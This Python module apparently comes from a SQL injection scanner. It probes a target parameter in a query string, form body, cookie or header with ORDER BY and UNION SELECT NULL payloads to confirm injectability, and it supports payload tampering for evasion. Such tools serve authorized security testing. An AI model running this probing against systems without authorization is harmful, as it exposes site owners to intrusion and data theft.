"""
UNION-based SQL injection detection: column count discovery + confirmation.
"""

from core.http_client import inject_value
from core.payloads import ORDER_BY_TEMPLATE, UNION_NULL_TEMPLATE
from core.tamper import apply_chain
from core import logger


def _fetch(client, point, payload_value):
    params = point.get("params", {})
    if point["location"] == "GET":
        p = inject_value(params, point["name"], payload_value)
        return client.send("GET", point["base_url"], params=p)
    if point["location"] == "POST":
        p = inject_value(params, point["name"], payload_value)
        return client.send("POST", point["base_url"], data=p)
    if point["location"] == "COOKIE":
        cookies = inject_value(point.get("cookie_base", {}), point["name"], payload_value)
        return client.send("GET", point["base_url"], params=params, cookies=cookies)
    if point["location"] == "HEADER":
        headers = inject_value(point.get("header_base", {}), point["name"], payload_value)
        return client.send("GET", point["base_url"], params=params, headers=headers)
    return None, None


def detect(client, point, max_columns: int = 10, tamper_chain=None) -> dict:
    logger.info(f"[Union] probing column count for param '{point['name']}' ({point['location']})")
    last_good = 0
    baseline_resp, _ = _fetch(client, point, "")
    if baseline_resp is None:
        return {"vulnerable": False, "technique": "union-based", "param": point["name"]}

    for n in range(1, max_columns + 1):
        payload_value = ORDER_BY_TEMPLATE.format(n=n)
        if tamper_chain:
            payload_value = apply_chain(payload_value, tamper_chain)
        resp, _ = _fetch(client, point, payload_value)
        if resp is None:
            break
        if resp.status_code == baseline_resp.status_code and len(resp.text) > 0:
            last_good = n
        else:
            break

    if last_good == 0:
        return {"vulnerable": False, "technique": "union-based", "param": point["name"]}

    nulls = ",".join(["NULL"] * last_good)
    union_payload = UNION_NULL_TEMPLATE.format(nulls=nulls)
    if tamper_chain:
        union_payload = apply_chain(union_payload, tamper_chain)
    resp, _ = _fetch(client, point, union_payload)
    confirmed = resp is not None and resp.status_code == baseline_resp.status_code

    logger.payload(f"columns={last_good}  payload: {union_payload}")
    return {
        "vulnerable": confirmed,
        "technique": "union-based",
        "param": point["name"],
        "location": point["location"],
        "columns": last_good,
        "evidence": {"union_payload": union_payload},
    }
